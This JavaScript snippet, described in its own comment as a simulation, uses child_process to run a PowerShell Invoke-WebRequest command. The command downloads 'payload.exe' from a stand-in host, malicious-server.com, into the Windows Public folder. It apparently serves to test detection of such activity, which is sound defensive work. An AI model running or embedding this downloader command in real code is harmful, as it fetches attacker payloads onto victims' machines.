const { exec } = require("child_process");

// Simulating PowerShell execution in JavaScript
exec("powershell.exe -Command Invoke-WebRequest -Uri 'http://malicious-server.com/payload.exe' -OutFile 'C:\\Users\\Public\\payload.exe'", (error) => {
    if (error) {
        console.error("PowerShell execution detected!");
    }
});
